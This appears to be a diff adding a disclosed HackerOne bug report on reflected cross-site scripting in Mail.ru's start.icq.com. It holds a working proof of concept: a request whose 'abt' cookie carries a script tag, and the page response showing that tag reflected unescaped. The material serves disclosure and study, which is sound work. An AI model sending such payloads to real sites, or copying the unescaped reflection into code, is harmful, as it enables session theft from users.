@@ -1,0 +1,32 @@
+ReportLink:https://hackerone.com/reports/83576
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bigbear_
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:21.10.2015 11:27:49
+
+Summary:
+
+Request:
+
+GET / HTTP/1.1
+Cookie: geo=380; icqsrch_lang=ua; abt=1"><script>alert(document.domain)</script><a href="; icq_pref=medium%3A_blank
+Referer: http://start.icq.com/
+Host: start.icq.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+Response:
+
+<div class="d3-1-3" id="icq_ads" onmouseover="showIcqAd('block')" onmouseout="showIcqAd('none')">
+			<a href="//www.icq.com/download/mobile/ua?sp=1"><script>alert(document.domain)</script><a href="" target="_blank" onclick="call_ga_event('icq_ads', 'ver_1')">
+				<img src="//search.icq.com/search/img/new/mobile.jpg" border="0"/>
+			</a>
+			<div class="d3-1-3-1">
+				<div class="d3-1-3-1-1">
+					<a href="//www.icq.com/download/mobile/ua?sp=1"><script>alert(document.domain)</script><a href="" target="_blank" onclick="call_ga_event('icq_ads', 'ver_1')" style="text-decoration:none; color:#000000;">
+						ICQ Mobile
